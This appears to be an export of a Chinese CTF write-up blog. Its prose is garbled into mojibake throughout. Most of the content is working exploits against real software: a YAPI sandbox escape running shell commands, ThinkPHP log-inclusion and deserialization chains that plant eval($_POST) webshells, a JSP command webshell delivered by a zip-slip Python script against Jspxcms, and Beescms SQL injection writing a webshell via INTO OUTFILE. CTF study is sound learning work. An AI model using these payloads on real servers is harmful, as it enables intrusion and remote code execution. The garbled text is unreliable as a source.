æ‰“å­—æ¥è¯•è¿™ä¸ªé¡ºåº ä¸æ˜¯è¯´è¯•è¿™ä¸ªæµªè´¹æ—¶é—´ è€Œæ˜¯ç­‰å¾…çš„æ—¶é—´éå¸¸éå¸¸çŸ­æš‚ æ²¡æœ‰å®Œæ•´æ‰“å®Œå­—çš„æ—¶é—´\nåè®° è¿™æ¬¡çš„redpwnæœ‰47é“é¢˜ï¼Œå„ä¸ªæ–¹å‘éƒ½æœ‰é€‚åˆæˆ‘è¿™ç§ç­¾åˆ°é€‰æ‰‹çš„ç®€å•é¢˜ï¼Œå¥½è¯„~\nå°±æ˜¯æ‰“æ˜Ÿå·çš„é¢˜æ¶‰åŠåˆ°çš„jsåŸå‹æ±¡æŸ“é—®é¢˜ï¼Œå…‰é è¿™ä¸€ä¸¤ä¸ªé¢˜æä¸å¤ªæ‡‚ï¼Œä½†æ˜¯æœ€è¿‘çš„ååºåˆ—åŒ–é—®é¢˜è¿˜æ²¡æ€»ç»“å®Œï¼Œä¸‰å¿ƒäºŒæ„çš„ä¹Ÿä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹‹åä¸€å®šä¼šå›æ¥çœ‹çš„ï¼ï¼ï¼ç­‰ç€è¢«é­å°¸å§ å“¼\n","date":"2021-08-08T20:08:39+08:00","permalink":"https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/","section":"posts","tags":["wp"],"title":"RedpwnCTF2021 Wp"},{"categories":["CTF"],"contents":"cat flag ç®€ç®€å•å•cat flag\nHint: ç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flag\n\u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt; æç¤ºç®¡ç†å‘˜è®¿é—®è¿‡ï¼Œå…ˆcat /var/log/nginx/access.log\nä¹‹åç”¨%faç»•è¿‡ /?cmd=this_is_final_fl%faag_e2a457126032b42d.php\nreview - Nginx é‡è¦æ–‡ä»¶ç›®å½•ï¼š\né…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx ä¸»è¦é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service æ¨¡å—ï¼š/usr/lisb64/nginx/modules åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx/access.log ezrce ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ\næ˜¯ä¸€ä¸ªYAPIçš„ä¸»é¡µï¼Œæ ¹æ®é¢˜ç›®é‡Œrceçš„æç¤º æœæœçœ‹å·²çŸ¥çš„æ¼æ´ï¼šYapi å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´\né‚£å°±å¥½åŠäº† è·Ÿç€æ¥å°±è¡Œå’¯ï¼›é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®\nä¹‹åä¿®æ”¹å…¨å±€mockè„šæœ¬\nconst sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(\u0026#39;return process\u0026#39;) const process = myfun() mockjson = process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;command\u0026#34;).toString() ä¹‹åæ·»åŠ æ¥å£\nè„šæœ¬ä¸­çš„execSync()å¤„å¯rceï¼Œå…ˆç”¨wget http://xxxxx.burpcollaborator.netè¯•è¯•æ°´\nå¾ˆé¡ºåˆ©å˜› å¥½è€¶ï¼\ncat `ls`\t// spawnSync /bin/sh ENOBUFS cat `cd ../;ls`\t// config.json, init.lock, log, vendors cat `cd ../../;ls`\t// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var cd ../../;cat `ls`\t// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var cat `cd ../../;cat ffffffflllllaggggg`\t// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b} easythinkphp easythinkphp\nåªæœ‰ä¸€ä¸ªthinkphp 3.2.3çš„æ¬¢è¿é¡µé¢ï¼Œtpçš„æ´å¾ˆå¤š å¯ä»¥ç›´æ¥æ‹¿æ¥æ‰“ï¼Œå‚è€ƒï¼šã€æ¼æ´é€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥\n/index.php?m=--\u0026gt;\u0026lt;?=phpinfo();?\u0026gt; /index.php?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log å…ˆéªŒè¯ä¸€ä¸‹æ–‡æ¡£ä¸­çš„æ–¹æ³•ï¼ŒæˆåŠŸï¼Œä¹‹åæŠŠphpinfoæ¢æˆè‡ªå·±çš„ä¸€å¥è¯æœ¨é©¬\n/index.php?m=--\u0026gt;\u0026lt;?=eval($_POST[\u0026#39;wuhu\u0026#39;]);?\u0026gt; ä¼ å…¥å ç”¨èšå‰‘è¿æ¥å°±èƒ½æ‹¿flagäº†~\næˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ThinkphpGUIä¸€æŠŠæ¢­ï¼ä¸€é”®getshell ä½ å€¼å¾—æ‹¥æœ‰\njspxcms ä¹Ÿæœ‰ç°æˆçš„æ´å¯ä»¥ç›´æ¥ç”¨ï¼Œå‚è€ƒï¼šå¤ç°jspxcmsè§£å‹getshellæ¼æ´ | ä»£ç å®¡è®¡| Jspxcmsæ–‡ä»¶ä¸Šä¼ æ¼æ´(CNVD-2019-40540) | è®°ä¸€æ¬¡ç”±è¿½è¸ªæº¯æºå‘ç°çš„â€œä¸å®‰å…¨è§£å‹getshellâ€\né¦–å…ˆæ„é€ å«jspğŸçš„æ¶æ„waråŒ…ï¼ŒğŸé•¿è¿™æ ·\n\u0026lt;% if(\u0026#34;023\u0026#34;.equals(request.getParameter(\u0026#34;pwd\u0026#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026#34;wuhu\u0026#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } %\u0026gt; ä¹‹åæ”¾å…¥ä¸€ä¸ªè§£å‹åä¼šè‡ªåŠ¨å®Œæˆç›®å½•ç©¿è¶Šçš„zipåŒ…ä¸­ è¿™ä¸ªè¿‡ç¨‹ç”±pyè„šæœ¬å®Œæˆ\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary = b\u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;helloworld\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; zipFile = zipfile.ZipFile(\u0026#34;test123.zip\u0026#34;, \u0026#34;a\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test123.zip\u0026#34;) zipFile.writestr(\u0026#34;../../../../dog123.html\u0026#34;, binary) zipFile.close() except IOError as e: raise e import zipfile z = zipfile.ZipFile(\u0026#39;test123.zip\u0026#39;, \u0026#39;a\u0026#39;, zipfile.ZIP_DEFLATED) with open(\u0026#39;wuhu.war\u0026#39;, \u0026#39;rb\u0026#39;)as f: temp = f.read() z.writestr(\u0026#39;../../../../wuhu.war\u0026#39;, temp) z.close() éœ€è¦æ³¨æ„çš„æ˜¯ æœ€ç»ˆæˆ‘ä»¬è¦ç©¿è¶Šåˆ°çš„ç›®å½•æ˜¯ç½‘ç«™æ ¹ç›®å½•çš„ä¸Šå±‚ï¼Œå³webappsç›®å½•ä¸‹ ä¸ROOTç›®å½•åŒçº§ï¼Œå½“waråŒ…ä½äºè¿™ä¸ªç›®å½•ä¸‹æ‰ä¼šè‡ªåŠ¨éƒ¨ç½²\nç›´æ¥cat /flagå°±å¥½å•¦\ncybercms èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ\nHintï¼šä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½\nä¸€ä¸ªï¼ˆä¼ªï¼‰cmså¹³å°ä»‹ç»çš„é¡µé¢ï¼Œæ¯”è¾ƒç®€é™‹ï¼Œé¦–é¡µ/åº”ç”¨æ¡ˆä¾‹å¤„æ˜¾ç¤ºhacked by ymnhï¼Œåœ¨ymnhçš„å’¨è¯¢é¡µé¢å¤„æœ‰è¿™æ ·çš„æŠ¥é”™\nåœ¨é¦–é¡µ/æ–°é—»åŠ¨æ€å¤„ï¼Œå‡ ä¹æ‰€æœ‰çš„å¸–å­éƒ½æ˜¯hacked by xxx~~ï¼ˆæœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºæ˜¯å¤šä¹ˆå¤æ‚çš„é•¿ç¯‡å¤§è®ºï¼‰~~ï¼Œåœ¨å¦‚ä½•å®‰è£…å’Œä½¿ç”¨æ¨¡æ¿è¿™ç¯‡ä¸‹æœ‰æ²¡åˆ å¹²å‡€çš„ä¸œè¥¿\nå¦‚ä½•è®¾ç½®è¿›ç«™è¯­è¨€è¿™ç¯‡é‡Œç«Ÿç„¶æ˜¯è¿™æ ·çš„\nè‰ çœŸæ˜¯èšŒåŸ ä½äº† å›¾ç©·åŒ•è§äº†å±äºæ˜¯2333333\næ ¹æ®è¿™äº›ï¼Œå¯ä»¥å¾—çŸ¥æ•´ä¸ªç«™æ˜¯å®Œå…¨ç§»æ¤/å¥—å£³beescmsçš„ æ‰€ä»¥æ¥ç€å»æ‰¾å·²å­˜åœ¨çš„æ´ï¼Œå‚è€ƒï¼šBeescms_v4.0 sqlæ³¨å…¥æ¼æ´åˆ†æ\nåœ¨adminååŠ å•å¼•å·ï¼Œæç¤º\nè¡¨åæ˜¯bees_adminï¼Œæœ‰id, admin_name, admin_password, admin_purview, is_disableå…±5ä¸ªå­—æ®µ\nç®€å•fuzzå¯çŸ¥ï¼šè¿‡æ»¤äº†ç©ºæ ¼ï¼ˆç”¨/**/ç»•è¿‡ï¼‰ï¼ˆæˆ–è€…ç”¨tabç»•è¿‡ æˆ–è€…%0aç»•è¿‡ éƒ½å¯ä»¥ï¼‰ï¼Œè¿‡æ»¤äº†select, outfileï¼ˆåŒå†™ç»•è¿‡ï¼‰ï¼Œå¯¹å°–æ‹¬å·è½¬ä¹‰ä¸ºhtmlå®ä½“ï¼ˆç”¨hexç»•è¿‡ï¼‰\nuser=admin\u0026#39;/**/union/**/selselectect/**/1,2,3,4,5# å›æ˜¾æ­£å¸¸ï¼Œæ¥ç€å°è¯•å†™å…¥shellï¼ˆè¿™é‡Œè¦å†™æ¸…æ¥šç»å¯¹è·¯å¾„ï¼Œåœ¨ä¸Šé¢çš„ä¸€å¼ æŠ¥é”™çš„é¡µé¢ä¹Ÿæœ‰æ‰€æç¤ºäº†ï¼‰\nadmin\u0026#39;/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/\u0026#39;/var/www/html/wuhu.php\u0026#39;# å¥½è€¶ï¼Œè¿èšå‰‘æ‹¿flagå’¯\nez_website ç®€å•çš„é¢˜ç›®\nä¹Ÿæ˜¯ç°å®ä¸–ç•Œå­˜åœ¨çš„ä¸œè¥¿ï¼Œå‚è€ƒï¼šé½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡\nç›´æ¥ç”¨å·²æœ‰çš„é“¾å­æ‰“\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±» } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //è°ƒç”¨getError è¿”å›this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==\u0026gt;\u0026gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$queryæŒ‡å‘Query $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡ } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } ä¸Šä¼ \n/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D è™½ç„¶ä¼šè¿”å›ä¸€ä¸ªæŠ¥é”™çš„é¡µé¢ï¼Œä½†æ˜¯å¯ä»¥åœ¨/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.phpå¤„éªŒè¯ä¸€ä¸‹æ˜¯å¦å†™ä¸Šäº†ğŸï¼Œæ–‡ä»¶åå­—æ˜¯md5('tag_'.md5($this-\u0026gt;tag))ï¼Œè¿æ¥å¯†ç æ˜¯ccc ç›´æ¥èšå‰‘\nåœ¨é›ªæ®‡çš„wpä¸­ç”¨çš„æ˜¯å¦ä¸€ä¸ªï¼Œæ›´ç›´æ¥çš„å†™ğŸæ–¹å¼ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯ï¼ˆå¤§æ¦‚\næˆ‘ä»¬å¯ä»¥å…ˆå°è¯•çœ‹çœ‹æ•æ„Ÿå‡½æ•°file_put_contents()æ˜¯å¦èƒ½åˆ©ç”¨\nåœ¨application/admin/controller/Upgrade.phpä¸‹çœ‹åˆ°äº†æ–‡ä»¶å†™å…¥çš„å‡½æ•°ï¼Œå®ƒä½äºåœ¨writelog()ä¸­ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å¤„ç†postè¯·æ±‚ä¼ å…¥çš„å„é¡¹å‚æ•°\nè¿™ä¸ªconfig('client_upgrade_edition')æï¼Œè·Ÿäº†ä¸€ä¸‹ å®ƒä¼šè¿”å›nullï¼Œå†å¾€ä¸Šçœ‹åˆ°_initialize()\næ‰€ä»¥æœ€åæ˜¯ä¼šå°†$upgrade_editionå†™å…¥ä¸­/runtime/client_upgrade_edtion.phpä¸­ï¼›è€Œæ•´ä¸ªwritelog()å‡½æ•°ä¼šè¢«sysup()è°ƒç”¨\nè·Ÿè¿›è¿™ä¸ªsysup()å’Œ$upgrade_edtionï¼Œçœ‹æ˜¯å¦å¯ç”¨+å¦‚ä½•ç”¨\nåœ¨template/admin_style/default/admin/upgrade/index.htmä¸‹çœ‹åˆ°äº†ç¡®å®å­˜åœ¨çš„è·¯ç”±ï¼Œè¿™ä¸ªçš„é¡µé¢æ˜¯åœ¨åå°ç®¡ç†ä¸­å¿ƒ - ç³»ç»ŸåŠŸèƒ½ - ç³»ç»Ÿåœ¨çº¿å‡çº§å¤„ï¼Œéšä¾¿å‡ä¸€ä¸ªçœ‹çœ‹\næŠ“åŒ…ä¹‹åçœ‹åˆ°è¿™é‡Œç¡®å®æœ‰postè®¿é—®å’Œupgrade_edtionå‚æ•°ï¼Œé‚£å°±ç¨³äº†ï¼Œç›´æ¥å†™ğŸ\n/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E// å°†ğŸå†™è¿›çš„ç›®æ ‡é¡µé¢/runtime/client_upgrade_edition.phpè¿å…¥èšå‰‘ æ‹¿flagå³å¯\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™æˆ‘å…¶å®æ˜¯æ²¡æœ‰æœåˆ°é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡è¿™ç¯‡çš„ï¼Œå½“æ—¶æ€è·¯æ˜¯åœ¨åå°åœ¨æ‰¾æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ç›´æ¥å†™ğŸ ï¼Œå½“æ—¶æ‰¾çš„æ˜¯ç‹¬ç«‹é¡µç®¡ç†ï¼Œå°è¯•uploadï¼Œä½†æ˜¯å¹¶ä¸å¤ªè¡Œï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ï¼Œç„¶åä¹Ÿæ²¡å»å®¡ä»£ç ï¼ˆæ‡’ç‹—ï¼‰æ‰€ä»¥ å°±æ²¡å‡ºè¿™ä¸ªé¢˜ï¼Œç°åœ¨çœ‹è¿˜æ˜¯ç–å¿½äº† ç¡®å®å®Œå…¨æ²¡æ³¨æ„åˆ°ç³»ç»Ÿåœ¨çº¿å‡çº§è¿™ä¸ªæ¨¡å—æ˜¯å¯ç”¨çš„ ä¹Ÿæ²¡æœ‰è®¤çœŸçš„åˆ†ææºç  æˆ‘çš„è¿‡\nå®‰å…¨,å®‰å…¨,è¿˜æ˜¯xxxçš„å®‰å…¨ æŸä¸ªç‰¹åˆ«å®‰å…¨çš„å•†åº—\nHint:\nCREATE TABLE \u0026#34;users\u0026#34; ( \u0026#34;id\u0026#34; INTEGER NOT NULL, \u0026#34;username\u0026#34; TEXT UNIQUE , \u0026#34;login_password\u0026#34; text, \u0026#34;money\u0026#34; INTEGER, \u0026#34;pay_password\u0026#34; TEXT, \u0026#34;flag_num\u0026#34; INTEGER, PRIMARY KEY (\u0026#34;id\u0026#34;) ); CREATE TABLE \u0026#34;flaaaaaaaaag\u0026#34; ( \u0026#34;flllllllag\u0026#34; TEXT ); ç‰¹åˆ«ç®€é™‹çš„å‰ç«¯ï¼Œæœ‰ç™»å½•å’Œæ³¨å†Œå’Œä¸»é¡µä¸‰ä¸ªé¡µé¢ï¼Œç™»å½•å¤„æœ‰ä¸€å®šè¿‡æ»¤ å­˜åœ¨sqli\nä»»æ„æ³¨å†Œè´¦å·ï¼Œèµ°ä¸€æ³¢æµç¨‹\nğŸ˜…èšŒåŸ ä½äº†\nå›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹Burpå¯¹åˆšæ‰æ“ä½œçš„æŠ“åŒ…ç»“æœï¼Œä»cookieå¯ä»¥çŸ¥é“åç«¯æ˜¯flaskæ¡†æ¶ ï¼Œflaskçš„è¯ä¸€èˆ¬æ ‡é…sqliteæ•°æ®åº“ï¼Œç„¶åçœ‹ä¸‹é¡µé¢æºç \næ³¨å†Œæ—¶ç”¨postæäº¤ä¿¡æ¯ï¼Œå¯†ç éƒ¨åˆ†ç”¨çš„æ˜¯md5(app.users.password+'CBCTF')ï¼Œæ”¯ä»˜å¯†ç æ˜¯encrsa(app.users.pay_password)ï¼Œå¥½å®¶ä¼™ è¿™ä¸ªåŠ å¯† pay_passwordéƒ¨åˆ†md5+rsa+b64\u0026hellip;\u0026hellip;\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™åŸºæœ¬å°±åœåˆ°è¿™é‡Œäº†ï¼Œæ„Ÿè§‰æ˜¯sqli ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ³¨ å…¨æ˜¯md5çš„ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒwpä¹‹åçš„å¤ç°\nèµ›åè®²é¢˜çš„æ—¶å€™ å‡ºé¢˜å¸ˆå‚…è¯´å‚è€ƒçš„æ˜¯è¿™ä¸€ç¯‡æ–‡ç« æ•°æ®åŠ å¯†æˆ–æˆWAFå¤±æ•ˆæœ€å¤§å…ƒå‡¶â€¦ï¼ˆåŸå¸–è¢«404äº† åªæœ‰ä¸ªå¿«ç…§ è¿˜æ˜¯ç™¾åº¦å¿«ç…§æ‰èƒ½çœ‹ è€Œä¸”æ²¡å›¾ï¼‰æ ¸å¿ƒæ˜¯è¿™ä¸€æ®µ\nè¿™ä¸ªé¢˜çš„flagè´­ä¹°å°ç«™ï¼Œå¯¹pay_passwordæ˜¯è¿›è¡Œå‰ç«¯md5+rsa+b64åŠ å¯†ï¼Œåç«¯å†å¯¹åº”ç€æ‹¿ç§é’¥è§£å¯†ï¼Œå­˜å…¥æ•°æ®åº“çš„æ˜¯md5å€¼ï¼Œçœ‹ä¼¼å¾ˆå®Œç¾ ä½†æ˜¯å…¶å®æ ¹æœ¬æ²¡æœ‰wafçš„ä»‹å…¥ æ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå¦‚æœæˆ‘ä»¬ä»ä¸­é—´ä»‹å…¥ åªä¿ç•™rsa+b64çš„éƒ¨åˆ† å°±å¯ä»¥ä»»æ„æ§åˆ¶å‚æ•°è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„æ•ˆæœ\nå…¬é’¥åœ¨ç½‘é¡µæºç ä¸­å·²ç»ç»™å‡ºï¼Œæ•°æ®è¡¨çš„ç»“æœä¹Ÿå·²ç»åœ¨Hintä¸­äº†ï¼Œç”¨cyberchefä¸€æŠŠæ¢­\né‡æ–°æ³¨å†Œä¸ªè´¦å·ï¼Œåªä¿®æ”¹ä¸€ä¸‹usernameå³å¯ passwdä¸ç”¨å˜ å°†pay_passwordä¿®æ”¹ä¸ºä¸Šé¢ç”Ÿæˆçš„å€¼ï¼Œç™»é™†åå³å¯çœ‹åˆ°flag\njj\u0026rsquo;s camera jjåœ¨æŸæ¬¡ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¸­å‘ç°äº†ä¸ªé»‘å®¢åšçš„ç½‘ç«™ï¼Œè¯·ä½¿ç”¨httpsè®¿é—®ç«™ç‚¹\nHint: ç½‘ä¸Šèƒ½æœåˆ°æºç ï¼Œä»…ä¿®æ”¹äº†å‰ç«¯uiï¼Œæ³¨æ„æœåŠ¡å™¨çš„å“åº”\nä¹Ÿæ˜¯å·²æœ‰çš„ä¸œè¥¿ ä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡æœåˆ°æºç ï¼ˆå°´å°¬ï¼‰æºç åœ¨è¿™é‡Œï¼šåœ¨å—å®è´ï¼Ÿä½ ç‚¹å¼€è¿™ä¸ªç½‘å€çœ‹çœ‹[æ‰“å¼€ç½‘ç«™å·æ‹ç…§ç‰‡] | ç‚¹å¼€ä¸€ä¸ªç½‘å€æˆ‘è¢«è®°å½•äº†ipè¿˜å·æ‹äº†ç…§ç‰‡\nï¼ˆæˆ‘è¿™ä¸ªæ™ºå•†çœŸçš„æ˜¯è´Ÿæ•°èµ·æ­¥çš„ ä¸Šé¢è¿™ä¸¤ä¸ªå¸–å­æˆ‘çœ‹äº†å¥½ä¹… æ‰ååº”è¿‡æ¥è¿™ä¸ªé’“é±¼ç½‘ç«™æ˜¯è¦å¹²å•¥ã€‚ã€‚ã€‚ã€‚\nå‰ç«¯æ˜¯ä¸€ä¸ªé“¾æ¥ç”Ÿæˆç«™ ä¸­é—´å¯ä»¥åŠ ä¸€ä¸ªidçš„å‚æ•°ï¼Œè®¿é—®åä¼šè‡ªåŠ¨è°ƒç”¨æ‘„åƒå¤´ï¼ˆä½†æ˜¯ä¼šæœ‰ä¸ªæç¤ºçš„å¼¹çª—ï¼‰ï¼Œå…ˆæ‹ç…§å†ç›¸åº”é“¾æ¥ï¼Œä¹‹åå¯ä»¥åˆ°å…ˆå‰çš„é¡µé¢æŸ¥çœ‹æ‹åˆ°çš„ç…§ç‰‡ï¼Œæ•°æ®ä»¥postçš„å½¢å¼ä¸Šä¼ è‡³/qbl.php?id=xxx\u0026amp;url=xxxï¼Œè¿™æ˜¯qbl.phpçš„æºç \n\u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//å­˜æ”¾åœ¨å½“å‰ç›®å½•çš„imgæ–‡ä»¶å¤¹ä¸‹ if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt; file_put_contents()æ‰§è¡Œæ–‡ä»¶å†™å…¥ï¼Œå†…å®¹å¯æ§+è·¯å¾„å·²çŸ¥ï¼Œè¿‡æ»¤çš„ç‚¹åœ¨äºåç¼€åæ˜¯bmpæˆ–png å¹¶ä¸”åªæœ‰é™¤å»åç¼€çš„è¿™æ–‡ä»¶åå¯æ§ï¼Œphpç‰ˆæœ¬æ˜¯5.2.17ï¼Œç”¨00æˆªæ–­ç»•è¿‡ï¼ˆpostéƒ¨åˆ†è¦urlencodeä¸€ä¸‹ 